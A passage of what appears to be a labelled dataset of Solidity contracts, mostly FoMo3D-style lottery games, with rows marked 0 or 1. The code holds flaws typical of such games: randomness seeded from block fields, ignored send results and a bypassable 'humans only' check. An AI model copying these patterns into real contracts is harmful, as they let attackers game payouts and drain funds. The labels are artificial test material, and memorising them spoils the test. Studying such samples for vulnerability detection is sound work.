(_win.mul(plyrRnds_[round_[_rID].plyrs[i]][_rID].keys) / totalWinnersKeys_).add(plyr_[round_[_rID].plyrs[i]].win);        }                         round_[_rID].mask = _ppt.add(round_[_rID].mask);                         if (!teamAddress.send(_fee)) {                     }                             _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + (round_[_rID].plyrs[winnerNum_ - 1] * 100000000000000000000000000) + (round_[_rID].team * 100000000000000000);        _eventData_.winnerAddr = plyr_[round_[_rID].plyrs[winnerNum_ - 1]].addr;        _eventData_.winnerName = plyr_[round_[_rID].plyrs[winnerNum_ - 1]].name;        _eventData_.amountWon = _win;        _eventData_.genAmount = _gen;        _eventData_.P3DAmount = ((round_[_rID].pot).mul(potSplit_[round_[_rID].team].p3d)) / 100;        _eventData_.newPot = _res;                         rID_++;        _rID++;        round_[_rID].strt = now;        round_[_rID].end = now.add(rndInit_).add(rndGap_);        round_[_rID].pot = _res;                return(_eventData_);    }             function updateGenVault(uint256 _pID, uint256 _rIDlast)        private     {        uint256 _earnings = calcUnMaskedEarnings(_pID, _rIDlast);        if (_earnings > 0)        {                         plyr_[_pID].gen = _earnings.add(plyr_[_pID].gen);                         plyrRnds_[_pID][_rIDlast].mask = _earnings.add(plyrRnds_[_pID][_rIDlast].mask);        }    }             function updateTimer(uint256 _keys, uint256 _rID)        private    {                 uint256 _now = now;                                                    uint256 _newTime;        if (_now > round_[_rID].end && hasPlayersInRound(_rID) == false)            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(_now);        else            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(round_[_rID].end);                         uint256 _rndEth = round_[_rID].eth;          uint256 _rndNeedSub = 0;          if (_rndEth >= (2000 ether)) {            if (_rndEth <= (46000 ether)) {                  _rndNeedSub = (1 hours).mul(_rndEth / (2000 ether));            } else {                _rndNeedSub = (1 hours).mul(23);                uint256 _ethLeft = _rndEth.sub(46000 ether);                if (_ethLeft <= (12000 ether)) {                    _rndNeedSub = _rndNeedSub.add((590 seconds).mul(_ethLeft / (2000 ether)));                } else {                      _rndNeedSub = 999;                }            }        }        if (_rndNeedSub != 999) {            uint256 _rndMax = rndMax_.sub(_rndNeedSub);                         if (_newTime < (_rndMax).add(_now))                round_[_rID].end = _newTime;            else                round_[_rID].end = _rndMax.add(_now);        }    }             function airdrop()        private         view         returns(bool)    {        uint256 seed = uint256(keccak256(abi.encodePacked(                        (block.timestamp).add            (block.difficulty).add            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add            (block.gaslimit).add            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add            (block.number)                    )));        if((seed - ((seed / 1000) * 1000)) < airDropTracker_)            return(true);        else            return(false);    }         function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private        returns(F3Ddatasets.EventReturns)    {                 uint256 _com = _eth / 50;        uint256 _p3d;        uint256 _long = _eth / 100;                         uint256 _aff = _eth / 10;                                  if (_affID != _pID && plyr_[_affID].name != "") {            plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);            emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);        } else {            _p3d = _aff;        }                _p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));        if (_p3d > 0)        {                            _eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);        }                          if (!teamAddress.send(_p3d.add(_com).add(_long))) {                     }                return(_eventData_);    }        function potSwap()        external        payable    {                 uint256 _rID = rID_ + 1;                round_[_rID].pot = round_[_rID].pot.add(msg.value);        emit F3Devents.onPotSwapDeposit(_rID, msg.value);    }             function distributeInternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _team, uint256 _keys, F3Ddatasets.EventReturns memory _eventData_)        private        returns(F3Ddatasets.EventReturns)    {                 uint256 _gen = (_eth.mul(fees_[_team].gen)) / 100;                         uint256 _air = (_eth / 100);        airDropPot_ = airDropPot_.add(_air);                         _eth = _eth.sub(((_eth.mul(14)) / 100).add((_eth.mul(fees_[_team].p3d)) / 100));                         uint256 _pot = _eth.sub(_gen);                                  uint256 _dust = updateMasks(_rID, _pID, _gen, _keys);        if (_dust > 0)            _gen = _gen.sub(_dust);                         round_[_rID].pot = _pot.add(_dust).add(round_[_rID].pot);                         _eventData_.genAmount = _gen.add(_eventData_.genAmount);        _eventData_.potAmount = _pot;                return(_eventData_);    }         function updateMasks(uint256 _rID, uint256 _pID, uint256 _gen, uint256 _keys)        private        returns(uint256)    {                                  uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        round_[_rID].mask = _ppt.add(round_[_rID].mask);                                      uint256 _pearn = (_ppt.mul(_keys)) / (1000000000000000000);        plyrRnds_[_pID][_rID].mask = (((round_[_rID].mask.mul(_keys)) / (1000000000000000000)).sub(_pearn)).add(plyrRnds_[_pID][_rID].mask);                         return(_gen.sub((_ppt.mul(round_[_rID].keys)) / (1000000000000000000)));    }             function withdrawEarnings(uint256 _pID)        private        returns(uint256)    {                 updateGenVault(_pID, plyr_[_pID].lrnd);                         uint256 _earnings = (plyr_[_pID].win).add(plyr_[_pID].gen).add(plyr_[_pID].aff);        if (_earnings > 0)        {            plyr_[_pID].win = 0;            plyr_[_pID].gen = 0;            plyr_[_pID].aff = 0;        }        return(_earnings);    }             function endTx(uint256 _pID, uint256 _team, uint256 _eth, uint256 _keys, F3Ddatasets.EventReturns memory _eventData_)        private    {        _eventData_.compressedData = _eventData_.compressedData + (now * 1000000000000000000) + (_team * 100000000000000000000000000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + _pID + (rID_ * 10000000000000000000000000000000000000000000000000000);                emit F3Devents.onEndTx        (            _eventData_.compressedData,            _eventData_.compressedIDs,            plyr_[_pID].name,            msg.sender,            _eth,            _keys,            _eventData_.winnerAddr,            _eventData_.winnerName,            _eventData_.amountWon,            _eventData_.newPot,            _eventData_.P3DAmount,            _eventData_.genAmount,            _eventData_.potAmount,            airDropPot_        );    }             bool public activated_ = false;    function activate()        isOwner()        public    {		                                   require(activated_ == false, "fomo3d already activated");                         activated_ = true;                         rID_ = 1;        round_[1].strt = now + rndExtra_ - rndGap_;        round_[1].end = now + rndInit_ + rndExtra_;    }}    library F3Ddatasets {                                                                                                                                                               struct EventReturns {        uint256 compressedData;        uint256 compressedIDs;        address winnerAddr;                  bytes32 winnerName;                  uint256 amountWon;                   uint256 newPot;                      uint256 P3DAmount;                   uint256 genAmount;                   uint256 potAmount;               }    struct Player {        address addr;            bytes32 name;            uint256 win;             uint256 gen;             uint256 aff;             uint256 lrnd;            uint256 laff;        }    struct PlayerRounds {        uint256 eth;             uint256 keys;            uint256 mask;            uint256 ico;         }    struct Round {        uint256[5] plyrs;            uint256 team;            uint256 end;             bool ended;              uint256 strt;            uint256 keys;            uint256 eth;             uint256 pot;             uint256 mask;            uint256 ico;             uint256 icoGen;          uint256 icoAvg;      }    struct TeamFee {        uint256 gen;             uint256 p3d;         }    struct PotSplit {        uint256 gen;             uint256 p3d;         }}    library F3DKeysCalcLong {    using SafeMath for *;         function keysRec(uint256 _curEth, uint256 _newEth)        internal        pure        returns (uint256)    {        return(keys((_curEth).add(_newEth)).sub(keys(_curEth)));    }             function ethRec(uint256 _curKeys, uint256 _sellKeys)        internal        pure        returns (uint256)    {        return((eth(_curKeys)).sub(eth(_curKeys.sub(_sellKeys))));    }         function keys(uint256 _eth)         internal        pure        returns(uint256)    {        return ((((((_eth).mul(1000000000000000000)).mul(312500000000000000000000000)).add(5624988281256103515625000000000000000000000000000000000000000000)).sqrt()).sub(74999921875000000000000000000000)) / (156250000);    }             function eth(uint256 _keys)         internal        pure        returns(uint256)      {        return ((78125000).mul(_keys.sq()).add(((149999843750000).mul(_keys.mul(1000000000000000000))) / (2))) / ((1000000000000000000).sq());    }}    interface Fomo3dContract {    function setOldContractData(address oldContract) external payable;} library NameFilter {         function nameFilter(string _input)        internal        pure        returns(bytes32)    {        bytes memory _temp = bytes(_input);        uint256 _length = _temp.length;                         require (_length <= 32 && _length > 0, "string must be between 1 and 32 characters");                 require(_temp[0] != 0x20 && _temp[_length-1] != 0x20, "string cannot start or end with space");                 if (_temp[0] == 0x30)        {            require(_temp[1] != 0x78, "string cannot start with 0x");            require(_temp[1] != 0x58, "string cannot start with 0X");        }                         bool _hasNonNumber;                         for (uint256 i = 0; i < _length; i++)        {                         if (_temp[i] > 0x40 && _temp[i] < 0x5b)            {                                 _temp[i] = byte(uint(_temp[i]) + 32);                                                 if (_hasNonNumber == false)                    _hasNonNumber = true;            } else {                require                (                                         _temp[i] == 0x20 ||                                          (_temp[i] > 0x60 && _temp[i] < 0x7b) ||                                         (_temp[i] > 0x2f && _temp[i] < 0x3a),                    "string contains invalid characters"                );                                 if (_temp[i] == 0x20)                    require( _temp[i+1] != 0x20, "string cannot contain consecutive spaces");                                                 if (_hasNonNumber == false && (_temp[i] < 0x30 || _temp[i] > 0x39))                    _hasNonNumber = true;                }        }                require(_hasNonNumber == true, "string cannot be only numbers");                bytes32 _ret;        assembly {            _ret := mload(add(_temp, 32))        }        return (_ret);    }} library SafeMath {             function mul(uint256 a, uint256 b)         internal         pure         returns (uint256 c)     {        if (a == 0) {            return 0;        }        c = a * b;        require(c / a == b, "SafeMath mul failed");        return c;    }         function sub(uint256 a, uint256 b)        internal        pure        returns (uint256)     {        require(b <= a, "SafeMath sub failed");        return a - b;    }         function add(uint256 a, uint256 b)        internal        pure        returns (uint256 c)     {        c = a + b;        require(c >= a, "SafeMath add failed");        return c;    }             function sqrt(uint256 x)        internal        pure        returns (uint256 y)     {        uint256 z = ((add(x,1)) / 2);        y = x;        while (z < y)         {            y = z;            z = ((add((x / z),z)) / 2);        }    }             function sq(uint256 x)        internal        pure        returns (uint256)    {        return (mul(x,x));    }             function pwr(uint256 x, uint256 y)        internal         pure         returns (uint256)    {        if (x==0)            return (0);        else if (y==0)            return (1);        else         {            uint256 z = x;            for (uint256 i=1; i < y; i++)                z = mul(z,x);            return (z);        }    }}
1<CODESPLIT>contract SmartRoulette {   address profitDistributionContract;   uint256 bankrolLimit;   uint256 profitLimit;   uint256 lastDateDistributedProfit;   function distributeProfits(uint256 gasValue){      if (profitDistributionContract > 0 && this.balance >= (bankrolLimit + profitLimit)) {         lastDateDistributedProfit = block.timestamp;         return;      }   }}
0<CODESPLIT>contract Random{    using SafeMath for *;    constructor()        public    {}    function isDrop(uint256 airDropTracker, address sender)        public        view        returns(bool)    {        uint256 seed = uint256(keccak256(abi.encodePacked(            (block.timestamp).add            (block.difficulty).add            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add            (block.gaslimit).add            ((uint256(keccak256(abi.encodePacked(sender)))) / (now)).add            (block.number)        )));        if((seed - ((seed / 1000) * 1000)) < airDropTracker)            return(true);        else            return(false);    }}library SafeMath {             function mul(uint256 a, uint256 b)         internal         pure         returns (uint256 c)     {        if (a == 0) {            return 0;        }        c = a * b;        require(c / a == b, "SafeMath mul failed");        return c;    }         function sub(uint256 a, uint256 b)        internal        pure        returns (uint256)     {        require(b <= a, "SafeMath sub failed");        return a - b;    }         function add(uint256 a, uint256 b)        internal        pure        returns (uint256 c)     {        c = a + b;        require(c >= a, "SafeMath add failed");        return c;    }             function sqrt(uint256 x)        internal        pure        returns (uint256 y)     {        uint256 z = ((add(x,1)) / 2);        y = x;        while (z < y)         {            y = z;            z = ((add((x / z),z)) / 2);        }    }             function sq(uint256 x)        internal        pure        returns (uint256)    {        return (mul(x,x));    }             function pwr(uint256 x, uint256 y)        internal         pure         returns (uint256)    {        if (x==0)            return (0);        else if (y==0)            return (1);        else         {            uint256 z = x;            for (uint256 i=1; i < y; i++)                z = mul(z,x);            return (z);        }    }}
0<CODESPLIT>contract FoMo3DWorld is modularLong, Ownable {    using SafeMath for *;    using NameFilter for string;    using F3DKeysCalcLong for uint256;     PlayerBookInterface constant private PlayerBook = PlayerBookInterface(0x789C537cE585595596D3905f401235f5A85B11d7);                        string constant public name = "FoMo3D World";    string constant public symbol = "F3DW";     uint256 constant private rndGap_ = 0;      uint256 constant private rndInit_ = 1 hours;                     uint256 constant private rndInc_ = 30 seconds;                   uint256 constant private rndMax_ = 24 hours;                     uint256 public airDropPot_;                  uint256 public airDropTracker_ = 0;          uint256 public rID_;                        mapping (address => uint256) public pIDxAddr_;               mapping (bytes32 => uint256) public pIDxName_;               mapping (uint256 => F3Ddatasets.Player) public plyr_;        mapping (uint256 => mapping (uint256 => F3Ddatasets.PlayerRounds)) public plyrRnds_;         mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_;                     mapping (uint256 => F3Ddatasets.Round) public round_;        mapping (uint256 => mapping(uint256 => uint256)) public rndTmEth_;                          mapping (uint256 => F3Ddatasets.TeamFee) public fees_;               mapping (uint256 => F3Ddatasets.PotSplit) public potSplit_;          constructor()    public    {                                                                                fees_[0] = F3Ddatasets.TeamFee(30, 6);            fees_[1] = F3Ddatasets.TeamFee(43, 0);            fees_[2] = F3Ddatasets.TeamFee(56, 10);           fees_[3] = F3Ddatasets.TeamFee(43, 8);                              potSplit_[0] = F3Ddatasets.PotSplit(15, 10);           potSplit_[1] = F3Ddatasets.PotSplit(25, 0);            potSplit_[2] = F3Ddatasets.PotSplit(20, 20);           potSplit_[3] = F3Ddatasets.PotSplit(30, 10);       }         modifier isActivated() {        require(activated_ == true, "its not ready yet.  check ?eta in discord");        _;    }         modifier isHuman() {        address _addr = msg.sender;        uint256 _codeLength;        assembly {_codeLength := extcodesize(_addr)}        require(_codeLength == 0, "sorry humans only");        _;    }         modifier isWithinLimits(uint256 _eth) {        require(_eth >= 1000000000, "pocket lint: not a valid currency");        require(_eth <= 100000000000000000000000, "no vitalik, no");        _;    }         function()    isActivated()    isHuman()    isWithinLimits(msg.value)    public    payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                 buyCore(_pID, plyr_[_pID].laff, 2, _eventData_);    }         function buyXid(uint256 _affCode, uint256 _team)    isActivated()    isHuman()    isWithinLimits(msg.value)    public    payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                          if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                     } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                 _team = verifyTeam(_team);                 buyCore(_pID, _affCode, _team, _eventData_);    }    function buyXaddr(address _affCode, uint256 _team)    isActivated()    isHuman()    isWithinLimits(msg.value)    public    payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                     } else {                         _affID = pIDxAddr_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 _team = verifyTeam(_team);                 buyCore(_pID, _affID, _team, _eventData_);    }    function buyXname(bytes32 _affCode, uint256 _team)    isActivated()    isHuman()    isWithinLimits(msg.value)    public    payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == '' || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                     } else {                         _affID = pIDxName_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 _team = verifyTeam(_team);                 buyCore(_pID, _affID, _team, _eventData_);    }         function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth)    isActivated()    isHuman()    isWithinLimits(_eth)    public    {                 F3Ddatasets.EventReturns memory _eventData_;                 uint256 _pID = pIDxAddr_[msg.sender];                          if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                     } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affCode, _team, _eth, _eventData_);    }    function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth)    isActivated()    isHuman()    isWithinLimits(_eth)    public    {                 F3Ddatasets.EventReturns memory _eventData_;                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                     } else {                         _affID = pIDxAddr_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }    function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth)    isActivated()    isHuman()    isWithinLimits(_eth)    public    {                 F3Ddatasets.EventReturns memory _eventData_;                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == '' || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                     } else {                         _affID = pIDxName_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }         function withdraw()    isActivated()    isHuman()    public    {                 uint256 _rID = rID_;                 uint256 _now = now;                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _eth;                 if (_now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)        {                         F3Ddatasets.EventReturns memory _eventData_;                         round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);                         _eth = withdrawEarnings(_pID);                         if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                         emit F3Devents.onWithdrawAndDistribute            (                msg.sender,                plyr_[_pID].name,                _eth,                _eventData_.compressedData,                _eventData_.compressedIDs,                _eventData_.winnerAddr,                _eventData_.winnerName,                _eventData_.amountWon,                _eventData_.newPot,                _eventData_.mktAmount,                _eventData_.genAmount            );                     } else {                         _eth = withdrawEarnings(_pID);                         if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                         emit F3Devents.onWithdraw(_pID, msg.sender, plyr_[_pID].name, _eth, _now);        }    }         function registerNameXID(string _nameString, uint256 _affCode, bool _all)    isHuman()    public    payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXIDFromDapp.value(_paid)(_addr, _name, _affCode, _all);        uint256 _pID = pIDxAddr_[_addr];                 emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }    function registerNameXaddr(string _nameString, address _affCode, bool _all)    isHuman()    public    payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXaddrFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);        uint256 _pID = pIDxAddr_[_addr];                 emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }    function registerNameXname(string _nameString, bytes32 _affCode, bool _all)    isHuman()    public    payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXnameFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);        uint256 _pID = pIDxAddr_[_addr];                 emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }         function getBuyPrice()    public    view    returns(uint256)    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].keys.add(1000000000000000000)).ethRec(1000000000000000000) );        else              return ( 75000000000000 );      }         function getTimeLeft()    public    view    returns(uint256)    {                 uint256 _rID = rID_;                 uint256 _now = now;        if (_now < round_[_rID].end)            if (_now > round_[_rID].strt + rndGap_)                return( (round_[_rID].end).sub(_now) );            else                return( (round_[_rID].strt + rndGap_).sub(_now) );        else            return(0);    }         function getPlayerVaults(uint256 _pID)    public    view    returns(uint256 ,uint256, uint256)    {                 uint256 _rID = rID_;                 if (now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)        {                         if (round_[_rID].plyr == _pID)            {                return                (                (plyr_[_pID].win).add( ((round_[_rID].pot).mul(48)) / 100 ),                (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)   ),                plyr_[_pID].aff                );                             } else {                return                (                plyr_[_pID].win,                (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)  ),                plyr_[_pID].aff                );            }                     } else {            return            (            plyr_[_pID].win,            (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),            plyr_[_pID].aff            );        }    }         function getPlayerVaultsHelper(uint256 _pID, uint256 _rID)    private    view    returns(uint256)    {        return(  ((((round_[_rID].mask).add(((((round_[_rID].pot).mul(potSplit_[round_[_rID].team].gen)) / 100).mul(1000000000000000000)) / (round_[_rID].keys))).mul(plyrRnds_[_pID][_rID].keys)) / 1000000000000000000)  );    }         function getCurrentRoundInfo()    public    view    returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256, uint256, uint256, uint256, uint256)    {                 uint256 _rID = rID_;        return        (        round_[_rID].ico,                        _rID,                                    round_[_rID].keys,                       round_[_rID].end,                        round_[_rID].strt,                       round_[_rID].pot,                        (round_[_rID].team + (round_[_rID].plyr * 10)),              plyr_[round_[_rID].plyr].addr,           plyr_[round_[_rID].plyr].name,           rndTmEth_[_rID][0],                      rndTmEth_[_rID][1],                      rndTmEth_[_rID][2],                      rndTmEth_[_rID][3],                      airDropTracker_ + (airDropPot_ * 1000)                       );    }         function getPlayerInfoByAddress(address _addr)    public    view    returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256)    {                 uint256 _rID = rID_;        if (_addr == address(0))        {            _addr == msg.sender;        }        uint256 _pID = pIDxAddr_[_addr];        return        (        _pID,                                        plyr_[_pID].name,                            plyrRnds_[_pID][_rID].keys,                  plyr_[_pID].win,                             (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                plyr_[_pID].aff,                             plyrRnds_[_pID][_rID].eth                    );    }         function buyCore(uint256 _pID, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)    private    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))        {                         core(_rID, _pID, msg.value, _affID, _team, _eventData_);                     } else {                         if (_now > round_[_rID].end && round_[_rID].ended == false)            {                                 round_[_rID].ended = true;                _eventData_ = endRound(_eventData_);                                 _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);                _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                 emit F3Devents.onBuyAndDistribute                (                    msg.sender,                    plyr_[_pID].name,                    msg.value,                    _eventData_.compressedData,                    _eventData_.compressedIDs,                    _eventData_.winnerAddr,                    _eventData_.winnerName,                    _eventData_.amountWon,                    _eventData_.newPot,                    _eventData_.mktAmount,                    _eventData_.genAmount                );            }                         plyr_[_pID].gen = plyr_[_pID].gen.add(msg.value);        }    }         function reLoadCore(uint256 _pID, uint256 _affID, uint256 _team, uint256 _eth, F3Ddatasets.EventReturns memory _eventData_)    private    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))        {                                                   plyr_[_pID].gen = withdrawEarnings(_pID).sub(_eth);                         core(_rID, _pID, _eth, _affID, _team, _eventData_);                     } else if (_now > round_[_rID].end && round_[_rID].ended == false) {                         round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                         emit F3Devents.onReLoadAndDistribute            (                msg.sender,                plyr_[_pID].name,                _eventData_.compressedData,                _eventData_.compressedIDs,                _eventData_.winnerAddr,                _eventData_.winnerName,                _eventData_.amountWon,                _eventData_.newPot,                _eventData_.mktAmount,                _eventData_.genAmount            );        }    }         function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)    private    {                 if (plyrRnds_[_pID][_rID].keys == 0)            _eventData_ = managePlayer(_pID, _eventData_);                 if (round_[_rID].eth < 100000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 1000000000000000000)        {            uint256 _availableLimit = (1000000000000000000).sub(plyrRnds_[_pID][_rID].eth);            uint256 _refund = _eth.sub(_availableLimit);            plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);            _eth = _availableLimit;        }                 if (_eth > 1000000000)        {                         uint256 _keys = (round_[_rID].eth).keysRec(_eth);                         if (_keys >= 1000000000000000000)            {                updateTimer(_keys, _rID);                                 if (round_[_rID].plyr != _pID)                    round_[_rID].plyr = _pID;                if (round_[_rID].team != _team)                    round_[_rID].team = _team;                                 _eventData_.compressedData = _eventData_.compressedData + 100;            }                         if (_eth >= 100000000000000000)            {                airDropTracker_++;                if (airdrop() == true)                {                                         uint256 _prize;                    if (_eth >= 10000000000000000000)                    {                                                 _prize = ((airDropPot_).mul(75)) / 100;                        plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                                 airDropPot_ = (airDropPot_).sub(_prize);                                                 _eventData_.compressedData += 300000000000000000000000000000000;                    } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {                                                 _prize = ((airDropPot_).mul(50)) / 100;                        plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                                 airDropPot_ = (airDropPot_).sub(_prize);                                                 _eventData_.compressedData += 200000000000000000000000000000000;                    } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {                                                 _prize = ((airDropPot_).mul(25)) / 100;                        plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                                 airDropPot_ = (airDropPot_).sub(_prize);                                                 _eventData_.compressedData += 300000000000000000000000000000000;                    }                                         _eventData_.compressedData += 10000000000000000000000000000000;                                         _eventData_.compressedData += _prize * 1000000000000000000000000000000000;                                         airDropTracker_ = 0;                }            }                         _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);                         plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);            plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);                         round_[_rID].keys = _keys.add(round_[_rID].keys);            round_[_rID].eth = _eth.add(round_[_rID].eth);            rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);                         _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);            _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);                         endTx(_pID, _team, _eth, _keys, _eventData_);        }    }         function calcUnMaskedEarnings(uint256 _pID, uint256 _rIDlast)    private    view    returns(uint256)    {        return(  (((round_[_rIDlast].mask).mul(plyrRnds_[_pID][_rIDlast].keys)) / (1000000000000000000)).sub(plyrRnds_[_pID][_rIDlast].mask)  );    }         function calcKeysReceived(uint256 _rID, uint256 _eth)    public    view    returns(uint256)    {                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].eth).keysRec(_eth) );        else              return ( (_eth).keys() );    }         function iWantXKeys(uint256 _keys)    public    view    returns(uint256)    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].keys.add(_keys)).ethRec(_keys) );        else              return ( (_keys).eth() );    }                             function receivePlayerInfo(uint256 _pID, address _addr, bytes32 _name, uint256 _laff)    external    {        require (msg.sender == address(PlayerBook), "your not playerNames contract... hmmm..");        if (pIDxAddr_[_addr] != _pID)            pIDxAddr_[_addr] = _pID;        if (pIDxName_[_name] != _pID)            pIDxName_[_name] = _pID;        if (plyr_[_pID].addr != _addr)            plyr_[_pID].addr = _addr;        if (plyr_[_pID].name != _name)            plyr_[_pID].name = _name;        if (plyr_[_pID].laff != _laff)            plyr_[_pID].laff = _laff;        if (plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }         function receivePlayerNameList(uint256 _pID, bytes32 _name)    external    {        require (msg.sender == address(PlayerBook), "your not playerNames contract... hmmm..");        if(plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }         function determinePID(F3Ddatasets.EventReturns memory _eventData_)    private    returns (F3Ddatasets.EventReturns)    {        uint256 _pID = pIDxAddr_[msg.sender];                 if (_pID == 0)        {                         _pID = PlayerBook.getPlayerID(msg.sender);            bytes32 _name = PlayerBook.getPlayerName(_pID);            uint256 _laff = PlayerBook.getPlayerLAff(_pID);                         